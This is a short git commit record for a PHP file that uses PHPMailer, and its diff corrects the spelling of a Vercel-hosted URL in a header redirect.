ad77b920e6923f12bd5e9bf772b298f8a19f496f
asif1012-lgtm <hpboost8@gmail.com>
2025-07-25 16:43:12 +0500

    Update jahangir3.php

--- jahangir3.php
+++ jahangir3.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://jangir3pass.vercel.app/");
+header("Location:https://jhangir3pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
